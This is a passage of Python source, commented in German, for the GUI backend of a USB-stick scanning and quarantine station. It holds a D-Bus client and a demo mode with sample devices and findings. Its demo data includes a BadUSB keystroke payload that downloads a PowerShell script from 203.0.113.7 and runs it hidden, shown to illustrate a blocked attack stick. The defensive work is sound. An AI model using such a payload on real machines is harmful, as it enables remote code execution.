"""Verbindung der GUI zum Dienst.

DBusBackend spricht über D-Bus mit firebridged. Die D-Bus-Anbindung
(dbus-next, asyncio) läuft in einem eigenen Thread; Ergebnisse kommen als
Qt-Signale im GUI-Thread an.

DemoBackend spielt einen Ablauf mit Beispieldaten vor (ohne Dienst, ohne
Hardware, ohne Netz), z. B. zum Ausprobieren der Oberfläche: firebridge-gui --demo
"""

from __future__ import annotations

import asyncio
import copy
import datetime as dt
import getpass
import json
import tempfile
import threading
import time
from pathlib import Path

from PySide6.QtCore import QObject, QTimer, Signal

from .. import BUS_NAME, INTERFACE, OBJECT_PATH, __version__, build
from .. import policy as policy_mod
from .. import virustotal as vt_mod
from ..share import ShareSettings, ShareStore


class Backend(QObject):
    statusChanged = Signal(dict)
    progressChanged = Signal(dict)
    transferChanged = Signal(dict)
    logLine = Signal(str)
    historyChanged = Signal(list)
    historyFull = Signal(list)        # Seite „Verlauf“ (viele Einträge)
    auditReady = Signal(list)         # Freigabe-Protokoll
    quarantineReady = Signal(list)    # gesperrte/freigegebene Dateien aller Prüfungen
    adminChanged = Signal(dict)       # {"has_password", "active_seconds", "root"}
    adminRequired = Signal(object, str)  # (nochmal versuchen, Meldung): Aktion braucht das Admin-Passwort
    adminLoginFailed = Signal(str)
    kioskChanged = Signal(dict)       # Antwort auf set_kiosk: {"on", "available", "reason"}
    adminConfirmed = Signal(str)      # Admin bestätigt für (Zweck), siehe admin_check
    reportReady = Signal(dict)
    transferFiles = Signal(dict)      # Bericht für die Dateiauswahl vor der Übertragung
    connectionChanged = Signal(bool, str)
    shareConfig = Signal(dict)
    shareTested = Signal(dict)
    vtChanged = Signal(dict)          # Fortschritt der VirusTotal-Abfrage
    vtConfig = Signal(dict)           # VirusTotal-Einstellungen (ohne Key)
    vtTested = Signal(dict)
    error = Signal(str)

    def start(self) -> None: ...
    def scan(self) -> None: ...
    def cancel(self) -> None: ...
    def eject(self) -> None: ...
    def transfer(self, target_id: str = "", files: list[str] | None = None) -> None: ...
    def load_transfer_files(self, rid: str) -> None: ...
    def cancel_transfer(self) -> None: ...
    def get_share(self) -> None: ...
    def set_share(self, data: dict) -> None: ...
    def delete_share(self, target_id: str) -> None: ...
    def select_share(self, target_id: str) -> None: ...
    def test_share(self, data: dict | None) -> None: ...
    def refresh_history(self) -> None: ...
    def get_full_history(self, limit: int = 1000) -> None: ...
    def get_audit(self, limit: int = 500) -> None: ...
    def get_quarantine(self, limit: int = 2000) -> None: ...
    def clear_history(self) -> None: ...
    def admin_status(self) -> None: ...
    def admin_login(self, password: str, then=None) -> None: ...
    def admin_logout(self) -> None: ...
    def admin_check(self, purpose: str) -> None: ...
    def set_kiosk(self, on: bool) -> None: ...
    def admin_set_password(self, password: str, then=None) -> None: ...
    def get_report(self, rid: str) -> None: ...
    def release(self, paths: list[str]) -> None: ...
    def set_policy(self, policy: dict) -> None: ...
    def update_now(self) -> None: ...
    def usb_allow(self, alert_id: str) -> None: ...
    def usb_dismiss(self, alert_id: str) -> None: ...
    def get_virustotal(self) -> None: ...
    def set_virustotal(self, data: dict) -> None: ...
    def test_virustotal(self) -> None: ...
    def vt_check(self) -> None: ...
    def vt_upload(self, paths: list[str], notice_confirmed: bool) -> None: ...
    def vt_send(self, paths: list[str], upload: bool, notice_confirmed: bool) -> None: ...
    def vt_cancel(self) -> None: ...


class DBusBackend(Backend):
    POLL_SECONDS = 5

    def __init__(self, session_bus: bool = False):
        super().__init__()
        self.session_bus = session_bus
        self.loop: asyncio.AbstractEventLoop | None = None
        self.iface = None
        self._connected = False
        # dbus-next liest die Signatur der Rückrufe aus, daher Lambdas statt Signal.emit
        self._handlers = {
            "state_changed": lambda s: self._on_state(s),
            "scan_progress": lambda s: self.progressChanged.emit(json.loads(s)),
            "transfer_progress": lambda s: self.transferChanged.emit(json.loads(s)),
            "vt_progress": lambda s: self.vtChanged.emit(json.loads(s)),
            "log_line": lambda s: self.logLine.emit(s),
        }

    def start(self) -> None:
        threading.Thread(target=lambda: asyncio.run(self._main()), name="dbus", daemon=True).start()

    async def _main(self) -> None:
        from dbus_next import BusType
        from dbus_next.aio import MessageBus

        self.loop = asyncio.get_running_loop()
        bus_type = BusType.SESSION if self.session_bus else BusType.SYSTEM
        bus = None
        while True:
            try:
                if bus is None or not bus.connected:
                    bus = await MessageBus(bus_type=bus_type).connect()
                intro = await bus.introspect(BUS_NAME, OBJECT_PATH)
                iface = bus.get_proxy_object(BUS_NAME, OBJECT_PATH, intro).get_interface(INTERFACE)
                for name, fn in self._handlers.items():
                    getattr(iface, f"on_{name}")(fn)
                self.iface = iface
                await self._fetch_status()
                await self._fetch_history()
                await self._fetch_admin()
                self._set_connected(True, "")
                while True:  # Lebenszeichen, frische Engine-Daten, Restzeit der Admin-Anmeldung
                    await asyncio.sleep(self.POLL_SECONDS)
                    await self._fetch_status()
                    await self._fetch_admin()
            except Exception as exc:  # Dienst fehlt, Rechte fehlen, Neustart …
                if self.iface is not None:
                    # alte Proxy-Rückrufe lösen, sonst kommen Signale nach dem Neuverbinden doppelt
                    for name, fn in self._handlers.items():
                        getattr(self.iface, f"off_{name}")(fn)
                self.iface = None
                self._set_connected(False, _dbus_message(exc))
                await asyncio.sleep(3)

    def _set_connected(self, ok: bool, msg: str) -> None:
        if ok != self._connected or not ok:
            self._connected = ok
            self.connectionChanged.emit(ok, msg)

    def _on_state(self, payload: str) -> None:
        self.statusChanged.emit(json.loads(payload))
        self._submit(self._fetch_history())

    async def _fetch_status(self) -> None:
        self.statusChanged.emit(json.loads(await self.iface.call_get_status()))

    async def _fetch_history(self) -> None:
        self.historyChanged.emit(json.loads(await self.iface.call_get_history(10)))

    def _submit(self, job) -> None:
        """job: Coroutine oder (für Aktionen mit Admin-Passwort) eine Funktion, die eine Coroutine liefert.
        Verlangt der Dienst das Admin-Passwort, kommt adminRequired mit einem „nochmal versuchen“."""
        factory = job if callable(job) else None
        if self.loop is None or self.iface is None:
            if factory is None:
                job.close()
            self.error.emit("Keine Verbindung zum Dienst")
            return

        async def wrapped():
            try:
                await (factory() if factory else job)
            except Exception as exc:
                if _is_admin_error(exc) and factory is not None:
                    self.adminRequired.emit(lambda: self._submit(factory), _dbus_message(exc))
                else:
                    self.error.emit(_dbus_message(exc))

        asyncio.run_coroutine_threadsafe(wrapped(), self.loop)

    def _call(self, name: str, *args) -> None:
        if self.iface is None:
            self.error.emit("Keine Verbindung zum Dienst")
            return
        self._submit(lambda: getattr(self.iface, name)(*args))

    # -- Admin

    async def _fetch_admin(self) -> None:
        fn = getattr(self.iface, "call_admin_status", None)
        if fn is not None:
            self.adminChanged.emit(json.loads(await fn()))

    def admin_status(self) -> None:
        if self.iface is not None:
            self._submit(self._fetch_admin())

    def admin_login(self, password: str, then=None) -> None:
        async def login():
            try:
                self.adminChanged.emit(json.loads(await self.iface.call_admin_login(password)))
            except Exception as exc:
                self.adminLoginFailed.emit(_dbus_message(exc))
                return
            if then:
                then()
        self._submit(login()) if self.iface is not None else self.adminLoginFailed.emit("Keine Verbindung zum Dienst")

    def admin_logout(self) -> None:
        async def logout():
            self.adminChanged.emit(json.loads(await self.iface.call_admin_logout()))
        if self.iface is not None:
            self._submit(logout())

    def admin_check(self, purpose: str) -> None:
        """adminConfirmed(purpose), sobald der Dienst den Aufrufer als Admin bestätigt (fragt sonst nach)."""
        async def check():
            fn = getattr(self.iface, "call_admin_check", None)
            if fn is None:
                raise RuntimeError("Der Dienst ist zu alt: bitte sudo ./install.sh ausführen und firebridged "
                                   "neu starten")
            await fn(purpose)
            self.adminConfirmed.emit(purpose)
        self._submit(check)

    def set_kiosk(self, on: bool) -> None:
        async def kiosk():
            fn = getattr(self.iface, "call_set_kiosk", None)
            if fn is None:
                raise RuntimeError("Der Dienst ist zu alt: bitte die Firebridge neu installieren und firebridged "
                                   "neu starten")
            self.kioskChanged.emit(json.loads(await fn(on)))
        self._submit(kiosk) if self.iface is not None else self.error.emit("Keine Verbindung zum Dienst")

    def admin_set_password(self, password: str, then=None) -> None:
        async def setpw():
            self.adminChanged.emit(json.loads(await self.iface.call_admin_set_password(password)))
            if then:
                then()
        self._submit(setpw) if self.iface is not None else self.error.emit("Keine Verbindung zum Dienst")

    def scan(self) -> None:
        self._call("call_scan")

    def cancel(self) -> None:
        self._call("call_cancel_scan")

    def eject(self) -> None:
        self._call("call_eject")

    def transfer(self, target_id: str = "", files: list[str] | None = None) -> None:
        self._call("call_transfer", target_id, json.dumps(files) if files is not None else "")

    def load_transfer_files(self, rid: str) -> None:
        async def fetch():
            self.transferFiles.emit(json.loads(await self.iface.call_get_report(rid)))
        if self.iface is not None:
            self._submit(fetch())

    def cancel_transfer(self) -> None:
        self._call("call_cancel_transfer")

    def get_share(self) -> None:
        async def fetch():
            self.shareConfig.emit(json.loads(await self.iface.call_get_share()))
        if self.iface is not None:
            self._submit(fetch())

    def set_share(self, data: dict) -> None:
        async def save():
            self.shareConfig.emit({**json.loads(await self.iface.call_set_share(json.dumps(data))),
                                   "saved": True})
        self._submit(save) if self.iface is not None else self.error.emit("Keine Verbindung zum Dienst")

    def _share_call(self, name: str, target_id: str) -> None:
        async def run():
            self.shareConfig.emit(json.loads(await getattr(self.iface, name)(target_id)))
        self._submit(run) if self.iface is not None else self.error.emit("Keine Verbindung zum Dienst")

    def delete_share(self, target_id: str) -> None:
        self._share_call("call_delete_share", target_id)

    def select_share(self, target_id: str) -> None:
        self._share_call("call_select_share", target_id)

    def test_share(self, data: dict | None) -> None:
        async def test():
            try:
                res = await self.iface.call_test_share(json.dumps(data) if data else "")
                self.shareTested.emit(json.loads(res))
            except Exception as exc:
                if _is_admin_error(exc):
                    self.shareTested.emit({"ok": False, "message": "Abgebrochen: Admin-Passwort nötig", "steps": []})
                    raise  # löst die Passwort-Abfrage aus
                # andere Fehler gehören in die Einstellungsseite, nicht in ein Popup
                self.shareTested.emit({"ok": False, "message": _dbus_message(exc), "steps": []})
        if self.iface is None:
            self.shareTested.emit({"ok": False, "message": "Keine Verbindung zum Dienst", "steps": []})
        else:
            self._submit(test)

    def refresh_history(self) -> None:
        if self.iface is not None:
            self._submit(self._fetch_history())

    def get_report(self, rid: str) -> None:
        async def fetch():
            self.reportReady.emit(json.loads(await self.iface.call_get_report(rid)))
        if self.iface is not None:
            self._submit(fetch())

    def _fetch_list(self, method: str, limit: int, signal) -> None:
        async def fetch():
            fn = getattr(self.iface, method, None)
            if fn is None:  # Dienst ist älter als die Oberfläche
                raise RuntimeError("Der Dienst kennt diese Ansicht noch nicht: bitte sudo ./install.sh "
                                   "ausführen und firebridged neu starten")
            signal.emit(json.loads(await fn(limit)))
        if self.iface is not None:
            self._submit(fetch())

    def get_full_history(self, limit: int = 1000) -> None:
        self._fetch_list("call_get_history", limit, self.historyFull)

    def get_audit(self, limit: int = 500) -> None:
        self._fetch_list("call_get_audit", limit, self.auditReady)

    def get_quarantine(self, limit: int = 2000) -> None:
        self._fetch_list("call_get_quarantine", limit, self.quarantineReady)

    def clear_history(self) -> None:
        async def clear():
            fn = getattr(self.iface, "call_clear_history", None)
            if fn is None:
                raise RuntimeError("Der Dienst kann den Verlauf noch nicht löschen: bitte sudo ./install.sh "
                                   "ausführen und firebridged neu starten")
            await fn()
            await self._fetch_history()
            self.historyFull.emit(json.loads(await self.iface.call_get_history(1000)))
        if self.iface is not None:
            self._submit(clear)

    def release(self, paths: list[str]) -> None:
        self._call("call_release", json.dumps(paths))

    def set_policy(self, policy: dict) -> None:
        self._call("call_set_policy", json.dumps(policy))

    def update_now(self) -> None:
        self._call("call_update_now")

    def usb_allow(self, alert_id: str) -> None:
        self._call("call_usb_allow", alert_id)

    def usb_dismiss(self, alert_id: str) -> None:
        self._call("call_usb_dismiss", alert_id)

    def get_virustotal(self) -> None:
        async def fetch():
            self.vtConfig.emit(json.loads(await self.iface.call_get_virus_total()))
        if self.iface is not None:
            self._submit(fetch())

    def set_virustotal(self, data: dict) -> None:
        async def save():
            self.vtConfig.emit({**json.loads(await self.iface.call_set_virus_total(json.dumps(data))),
                                "saved": True})
        self._submit(save) if self.iface is not None else self.error.emit("Keine Verbindung zum Dienst")

    def test_virustotal(self) -> None:
        async def test():
            try:
                self.vtTested.emit(json.loads(await self.iface.call_test_virus_total()))
            except Exception as exc:
                self.vtTested.emit({"ok": False, "message": _dbus_message(exc), "steps": []})
        if self.iface is None:
            self.vtTested.emit({"ok": False, "message": "Keine Verbindung zum Dienst", "steps": []})
        else:
            self._submit(test())

    def vt_check(self) -> None:
        self._call("call_virus_total_check")

    def vt_upload(self, paths: list[str], notice_confirmed: bool) -> None:
        self._call("call_virus_total_upload", json.dumps(paths), notice_confirmed)

    def vt_send(self, paths: list[str], upload: bool, notice_confirmed: bool) -> None:
        self._call("call_virus_total_send", json.dumps(paths), upload, notice_confirmed)

    def vt_cancel(self) -> None:
        self._call("call_cancel_virus_total")


def _is_admin_error(exc: Exception) -> bool:
    return str(getattr(exc, "type", "")).endswith(".Error.AdminRequired")


def _dbus_message(exc: Exception) -> str:
    text = getattr(exc, "text", None) or str(exc) or exc.__class__.__name__
    if "ServiceUnknown" in exc.__class__.__name__ or "was not provided" in text:
        return "Dienst firebridged läuft nicht"
    if "AccessDenied" in text or "not allowed" in text.lower():
        return "Keine Berechtigung: Benutzer ist nicht in der Gruppe 'firebridge'"
    return text


# ---------------------------------------------------------------------------
# Demo

def _now_iso(offset_h: float = 0) -> str:
    return (dt.datetime.now().astimezone() - dt.timedelta(hours=offset_h)).isoformat(timespec="seconds")


DEMO_STICK = {
    "devname": "/dev/sdb", "sys_name": "sdb", "devnum": "8:16", "bus": "usb",
    "vendor": "SanDisk", "model": "Ultra Fit", "serial": "4C530001230817114591A2",
    "vendor_id": "0781", "product_id": "5583", "size_bytes": 30_752_000_000,
    "display_name": "SanDisk Ultra Fit",
    "interfaces": [{"class": "08", "code": "08/06/50", "name": "Massenspeicher"}],
    "suspicious_interfaces": [],
    "partitions": [{"devname": "/dev/sdb1", "devnum": "8:17", "fstype": "exfat", "label": "DATEN",
                    "uuid": "6A3B-11F0", "size_bytes": 30_750_000_000,
                    "mountpoint": "/run/firebridge/mnt/sdb/sdb1",
                    "note": "read-only (ro,noexec,nosuid,nodev,noatime,umask=077)"}],
}

DEMO_BADUSB = {
    "devname": "/dev/sdc", "sys_name": "sdc", "devnum": "8:32", "bus": "usb",
    "vendor": "", "model": "", "serial": "", "vendor_id": "16d0", "product_id": "0753",
    "size_bytes": 2_000_000_000, "display_name": "Unbekannt 16d0:0753",
    "interfaces": [{"class": "03", "code": "03/01/01", "name": "Eingabegerät (HID)"},
                   {"class": "08", "code": "08/06/50", "name": "Massenspeicher"}],
    "suspicious_interfaces": [{"class": "03", "code": "03/01/01", "name": "Eingabegerät (HID)"}],
    "partitions": [],
}

DEMO_BADUSB_USB = {
    "port": "1-3", "usb_id": "16d0:0753", "vendor_id": "16d0", "product_id": "0753", "name": "Unbekannt 16d0:0753",
    "serial": "", "kind": "badusb", "kind_text": "Speicher mit Tastatur oder Netzwerk (BadUSB)", "keyboard": True,
    "interfaces": [{"class": "03", "code": "03/01/01", "name": "Tastatur (HID)"},
                   {"class": "08", "code": "08/06/50", "name": "Massenspeicher"}],
}
DEMO_KEYBOARD_USB = {
    **DEMO_BADUSB_USB, "kind": "eingabe", "kind_text": "Eingabegerät",
    "interfaces": [{"class": "03", "code": "03/00/00", "name": "Eingabegerät (HID)"}],
}
DEMO_PAYLOAD = '[SUPER+R]powershell -w hidden -c "iwr http://203.0.113.7/p.ps1|iex"[ENTER]'

# Auffällige Dateien der Demo (wie im Konzept): eine gesperrt, drei mit "Freigabe nötig"
DEMO_SUSPICIOUS = [
    {"path": "sdb1/Projekte/Angebot_2026/rechnung.xlsm", "size": 48_211, "sha256": "c" * 64,
     "status": "suspicious", "action": "freigabe",
     "detail": "VBA-Makros, startet beim Öffnen (Workbook_Open), verdächtig: Shell, CreateObject",
     "hits": [{"engine": "olevba", "category": "macro", "rule": "makro-auto", "action": "freigabe",
               "detail": "VBA-Makros, startet beim Öffnen (Workbook_Open), verdächtig: Shell, CreateObject"}]},
    {"path": "sdb1/tools/setup.ps1", "size": 2_114, "sha256": "d" * 64, "status": "suspicious",
     "action": "freigabe", "detail": "Skript (.ps1), ruft powershell auf, enthält -EncodedCommand",
     "hits": [{"engine": "Dateityp", "category": "script", "rule": "endung", "action": "freigabe",
               "detail": "Skript (.ps1), ruft powershell auf, enthält -EncodedCommand"}]},
    {"path": "sdb1/Fotos.lnk", "size": 1_532, "sha256": "e" * 64, "status": "suspicious", "action": "freigabe",
     "detail": "Windows-Verknüpfung, startet cmd.exe",
     "hits": [{"engine": "Dateityp", "category": "autostart", "rule": "verknuepfung", "action": "freigabe",
               "detail": "Windows-Verknüpfung, startet cmd.exe"}]},
    {"path": "sdb1/tools/Treiber/install.exe", "size": 912_384, "sha256": "f" * 64, "status": "suspicious",
     "action": "blockieren", "detail": "Windows-Programm (PE)",
     "hits": [{"engine": "Dateityp", "category": "executable", "rule": "programm", "action": "blockieren",
               "detail": "Windows-Programm (PE)"}]},
]


# VirusTotal-Ergebnisse der Demo: Makro-Datei bekannt und harmlos, Verknüpfung mit 2 Meldungen,
# Programm von 41 Engines erkannt, Skript unbekannt (lässt sich hochladen)
DEMO_VT = {
    "sdb1/Projekte/Angebot_2026/rechnung.xlsm": {"state": "found", "how": "hash", "malicious": 0, "suspicious": 0,
                                                 "total": 72, "rating": "ok"},
    "sdb1/tools/setup.ps1": {"state": "unknown", "how": "hash"},
    "sdb1/Fotos.lnk": {"state": "found", "how": "hash", "malicious": 2, "suspicious": 0, "total": 71,
                       "rating": "warn"},
    "sdb1/tools/Treiber/install.exe": {"state": "found", "how": "hash", "malicious": 41, "suspicious": 2,
                                       "total": 72, "rating": "hit"},
}


class DemoBackend(Backend):
    """Spielt Einstecken → Prüfen → Ergebnis → Auswerfen mit Beispieldaten vor."""

    TOTAL = 1904

    def __init__(self, autoplay: bool = True):
        super().__init__()
        self.autoplay = autoplay
        self.cycle = 0
        self.history: list[dict] = [
            {"id": "", "time": _now_iso(0.3), "device": "Intenso Basic Line", "usb_id": "1f75:0917",
             "files": 212, "infected": 0, "result": "sauber"},
            {"id": "", "time": _now_iso(0.8), "device": "Kingston DataTraveler", "usb_id": "0951:1666",
             "files": 1048, "infected": 2, "result": "infiziert"},
            {"id": "", "time": _now_iso(20), "device": "Unbekannt 0483:5740", "usb_id": "0483:5740",
             "files": None, "infected": 0, "result": "BadUSB"},
        ]
        self.st = {
            "version": __version__, "build": build.info(), "kiosk": {"on": False, "available": True, "reason": ""}, "station_name": "Prüfstation 01", "hostname": "demo",
            "state": "LEERLAUF", "device": None, "pending_devices": 0, "progress": None,
            "result": None, "findings": [], "message": "",
            "engine": {"backend": "clamd", "engine": "ClamAV 1.4.3", "db_version": "27801",
                       "db_time": _now_iso(4.5), "available": True, "message": "clamd aktiv",
                       "age_hours": 4.5},
            "signatures_outdated": False, "signature_warn_hours": 36,
            "smb": {"configured": True, "target": "\\\\nas01\\scans\\Eingang\\USB", "server": "nas01",
                    "connected": False, "editable": True, "transfer_block": "Erst nach einer Prüfung möglich",
                    "firewall": {"ok": True, "open": False, "message": "nftables: Netzwerk gesperrt"}},
            "transfer": None, "transfer_result": None,
            "scan_cache": {"entries": 214, "max": 1000},
            "analysis": {"yara": {"available": True, "ready": True, "rules": 4612, "compiled": _now_iso(4.4),
                                  "source": "YARA Forge core", "version": "20261026", "skipped": 23,
                                  "custom": 0, "yara_x": "1.22.1", "message": ""},
                         "olevba": True, "magic": True},
            "update": {"running": False, "started": _now_iso(4.5), "finished": _now_iso(4.4), "ok": True,
                       "steps": [{"name": "ClamAV", "ok": True, "message": "daily.cld updated (version: 27801)"},
                                 {"name": "clamd", "ok": True, "message": "clamd lädt die Signaturen neu"},
                                 {"name": "YARA Forge", "ok": True,
                                  "message": "YARA Forge 20261026 geladen (1 840 KB, Prüfsumme geprüft)"},
                                 {"name": "YARA-X", "ok": True,
                                  "message": "4612 Regeln übersetzt, 23 mit YARA-X nicht übersetzbar"}]},
            "policy": policy_mod.defaults(), "policy_categories": policy_mod.describe(), "policy_editable": True,
            "usb_guard": {"mode": "usbguard", "active": True, "grabbed": 0, "alerts": [],
                          "message": "USBGuard aktiv: 7 Geräte, 0 gesperrt"},
            "virustotal": {"mode": "upload", "mode_label": "Upload", "license": "public",
                           "license_confirmed": _now_iso(30), "threshold": 3, "block_on_error": False,
                           "has_key": True, "ready": True, "allow_upload": True, "editable": True,
                           "quota_used": 37, "quota_limit": 500, "per_minute": 4, "max_upload_mb": 650,
                           "noncommercial_text": vt_mod.NONCOMMERCIAL_TEXT, "progress": None,
                           "message": "Hash-Abfrage, Upload nach Bestätigung"},
            "log": [], "actions": {},
        }
        self._released: set[str] = set()
        self._vt: dict[str, dict] = {}
        self.audit: list[dict] = [
            {"time": _now_iso(0.8), "by": "mueller", "action": "uebertragung", "device": "Kingston DataTraveler",
             "text": "Übertragung gestartet: 1045 Dateien nach \\\\nas01\\scans\\Eingang\\USB"},
            {"time": _now_iso(0.85), "by": "mueller", "action": "datei", "device": "Kingston DataTraveler",
             "text": "Datei freigegeben: sdb1/tools/install.ps1"},
            {"time": _now_iso(26), "by": "schmidt", "action": "usb", "device": "",
             "text": "Tastatur (Tipp-Probe folgt) freigegeben: Logitech K120"},
        ]
        self.quarantine = [
            {"report": "", "time": _now_iso(0.8), "device": "Kingston DataTraveler", "serial": "60A44C41",
             "path": "sdb1/Rechnung_Oktober.pdf.exe", "size": 73_802, "sha256": "9f2c" + "0" * 60,
             "state": "infiziert", "reason": "Win.Trojan.Agent-1234567", "released": "", "released_by": ""},
            {"report": "", "time": _now_iso(0.8), "device": "Kingston DataTraveler", "serial": "60A44C41",
             "path": "sdb1/USB-Treiber/autorun.inf", "size": 120, "sha256": "b" * 64,
             "state": "infiziert", "reason": "Win.Worm.Autorun-55", "released": "", "released_by": ""},
            {"report": "", "time": _now_iso(0.85), "device": "Kingston DataTraveler", "serial": "60A44C41",
             "path": "sdb1/tools/install.ps1", "size": 4_210, "sha256": "c" * 64, "state": "freigegeben",
             "reason": "PowerShell-Skript", "released": _now_iso(0.85), "released_by": "mueller"},
            {"report": "", "time": _now_iso(30), "device": "SanDisk Cruzer Blade", "serial": "4C530001",
             "path": "sdb1/Spiele/setup.exe", "size": 2_302_111, "sha256": "d" * 64, "state": "gesperrt",
             "reason": "Windows-Programm (PE)", "released": "", "released_by": ""},
        ]
        self._vtimer = QTimer(self)
        self._vtimer.timeout.connect(self._vt_tick)
        # Die Demo nutzt den echten Zielspeicher, nur in einem Temp-Verzeichnis
        tmp = Path(tempfile.mkdtemp(prefix="firebridge-demo-"))
        self.store = ShareStore(tmp / "share.json", tmp / "share.secret")
        self.store.save(ShareSettings(name="NAS Eingang", server="nas01", share="scans", folder="Eingang/USB",
                                      username="firebridge"), "demo")
        self.store.save(ShareSettings(name="Archiv Buchhaltung", server="192.168.10.30", share="archiv",
                                      folder="USB-Eingang", username="buchhaltung", domain="FIRMA"), "demo")
        self._sync_smb()
        self._timer = QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._ttimer = QTimer(self)
        self._ttimer.timeout.connect(self._transfer_tick)
        self._usb_plugged = False
        self._robot = QTimer(self)
        self._robot.timeout.connect(self._robot_tick)
        self._done = 0
        self._scans = 0

    # -- Hilfen
    def _log(self, text: str) -> None:
        line = f"{dt.datetime.now():%H:%M:%S} {text}"
        self.st["log"].append(line)
        self.logLine.emit(line)

    def _set(self, state: str, message: str = "") -> None:
        s = self.st
        s["state"] = state
        s["message"] = message
        verdict = (s.get("result") or {}).get("verdict")
        block = ""
        if state != "ERGEBNIS":
            block = {"UEBERTRAGUNG": "Übertragung läuft", "UEBERTRAGEN": "Bereits übertragen"}.get(
                state, "Erst nach einer Prüfung möglich")
        elif verdict == "infiziert":
            block = "Schadsoftware gefunden, Übertragung gesperrt"
        elif not self.store.load().configured:
            block = "Kein Ziel-Share eingerichtet (Einstellungen)"
        s["smb"]["transfer_block"] = block
        s["smb"]["connected"] = state == "UEBERTRAGUNG"
        s["smb"]["firewall"]["open"] = state == "UEBERTRAGUNG"
        s["smb"]["firewall"]["message"] = ("nftables: tcp/445 offen nur zu 192.168.10.20" if state == "UEBERTRAGUNG"
                                           else "nftables: Netzwerk gesperrt")
        s["actions"] = {"scan": state in ("EINGEBUNDEN", "ERGEBNIS"), "cancel": state == "SCAN",
                        "eject": state in ("EINGEBUNDEN", "ERGEBNIS", "FEHLER", "UEBERTRAGEN"),
                        "transfer": not block, "cancel_transfer": state == "UEBERTRAGUNG",
                        "test_share": state in ("LEERLAUF", "AUSGEWORFEN", "UEBERTRAGEN")
                        or (state == "ERGEBNIS" and verdict in ("sauber", "auffällig")),
                        "release": state == "ERGEBNIS" and verdict == "auffällig",
                        "vt_check": state == "ERGEBNIS" and verdict != "infiziert" and s["virustotal"]["ready"],
                        "vt_upload": state == "ERGEBNIS" and s["virustotal"]["mode"] in vt_mod.UPLOAD_MODES
                        and any(v.get("state") == "unknown" for v in self._vt.values()),
                        "vt_send": state == "ERGEBNIS" and verdict != "infiziert" and s["virustotal"]["ready"],
                        "vt_cancel": state == "VIRUSTOTAL",
                        "vt_test": state in ("LEERLAUF", "AUSGEWORFEN", "ERGEBNIS"),
                        "update": state not in ("SCAN", "UEBERTRAGUNG") and not s["update"].get("running"),
                        "clear_history": state in ("LEERLAUF", "AUSGEWORFEN", "EINGEBUNDEN")}
        self.statusChanged.emit(copy.deepcopy(s))
        self.historyChanged.emit(list(self.history))

    def start(self) -> None:
        self.connectionChanged.emit(True, "")
        self._set("LEERLAUF")
        self.historyChanged.emit(list(self.history))
        self.admin_status()
        self._admin_timer = QTimer(self)
        self._admin_timer.timeout.connect(self.admin_status)
        self._admin_timer.start(30000)
        if self.autoplay:
            QTimer.singleShot(1500, self.insert_stick)

    def insert_stick(self) -> None:
        self.st["device"] = copy.deepcopy(DEMO_STICK)
        self.st["result"] = None
        self.st["findings"] = []
        self.st["transfer"] = None
        self.st["transfer_result"] = None
        self._log("Gerät erkannt: SanDisk Ultra Fit 0781:5583 an /dev/sdb, Schnittstellen: Massenspeicher (08)")
        self._log("mount /dev/sdb1 exfat → read-only (ro,noexec,nosuid,nodev,noatime,umask=077)")
        self._set("EINGEBUNDEN", "Bereit zum Prüfen")

    def insert_badusb(self) -> None:
        """USBGuard hat einen Speicher mit Tastatur gesperrt: er wird nie eingebunden, nur gemeldet."""
        self._alert(DEMO_BADUSB_USB, "Ein Speicher, der sich zusätzlich als Tastatur oder Netzwerkkarte meldet, "
                                     "ist typisch für Angriffs-Sticks. Das Gerät ist komplett gesperrt. Bitte "
                                     "abziehen und der IT übergeben.")
        self.history.insert(0, {"id": "", "time": _now_iso(), "device": "Unbekannt 16d0:0753",
                                "usb_id": "16d0:0753", "files": None, "infected": 0, "result": "BadUSB"})
        self._set(self.st["state"], self.st["message"])
        if self.autoplay:
            QTimer.singleShot(8000, self.unplug_usb)

    def insert_keyboard(self) -> None:
        """Ein "Tastatur"-Stick: freigeben startet die Tipp-Probe, er tippt aber selbst los."""
        self._alert(DEMO_KEYBOARD_USB, "Neue Tastaturen und Mäuse sind gesperrt, weil sich Angriffs-Sticks als "
                                       "Tastatur ausgeben. Hast du dieses Gerät selbst angeschlossen, kannst du "
                                       "es freigeben.", allow=True)
        self.history.insert(0, {"id": "", "time": _now_iso(), "device": "Unbekannt 16d0:0753",
                                "usb_id": "16d0:0753", "files": None, "infected": 0,
                                "result": "Eingabegerät gesperrt"})
        self._set(self.st["state"], self.st["message"])
        if self.autoplay:
            QTimer.singleShot(4000, lambda: self.usb_allow("2"))

    def _alert(self, dev: dict, message: str, allow: bool = False) -> None:
        aid = "1" if dev["kind"] == "badusb" else "2"
        self._usb_plugged = True
        ifaces = ", ".join(f"{i['name']} ({i['code']})" for i in dev["interfaces"])
        self._log(f"USB-Gerät eingesteckt: {dev['name']} {dev['usb_id']} an Port {dev['port']} "
                  f"→ {dev['kind_text']}, Schnittstellen: {ifaces}")
        self._log(f"Gesperrt (USBGuard): {dev['name']} – {message}")
        self.st["usb_guard"]["alerts"] = [{"id": aid, "time": _now_iso(), "state": "gesperrt", "blocked": True,
                                           "message": message, "device": copy.deepcopy(dev), "kind": dev["kind"],
                                           "allow_possible": allow, "reasons": [], "how": "USBGuard",
                                           "tries": 0, "tries_max": 3}]

    def unplug_usb(self) -> None:
        if not self._usb_plugged:
            return
        self._usb_plugged = False
        self._robot.stop()
        if self.st["usb_guard"]["alerts"]:
            self._log("USB-Gerät abgezogen: Unbekannt 16d0:0753 (Port 1-3)")
        self.st["usb_guard"]["alerts"] = []
        self.st["usb_guard"]["grabbed"] = 0
        self.remove()

    def usb_allow(self, alert_id: str) -> None:
        alerts = self.st["usb_guard"]["alerts"]
        if not alerts or alerts[0]["state"] != "gesperrt":
            return
        a = alerts[0]
        a.update({"state": "probe", "blocked": False, "allow_possible": False, "code": "4719",
                  "seconds_left": 120, "how": "USBGuard (allow-device 12)",
                  "message": "Code auf der neuen Tastatur eintippen und Enter drücken.",
                  "keys": {"keys": 0, "text": "", "digits": 0, "reasons": []}})
        self.st["usb_guard"]["grabbed"] = 1
        self._log("Tastatur Unbekannt 16d0:0753 vorläufig zugelassen (USBGuard (allow-device 12)), Tipp-Probe läuft")
        self._log("Tastatur /dev/input/event9 (Port 1-3) wird festgehalten, ihre Tasten erreichen den Rechner nicht")
        self._set(self.st["state"], self.st["message"])
        self._typed = 0
        QTimer.singleShot(1500, lambda: self._robot.start(60))

    def _robot_tick(self) -> None:
        alerts = self.st["usb_guard"]["alerts"]
        if not alerts:
            self._robot.stop()
            return
        a = alerts[0]
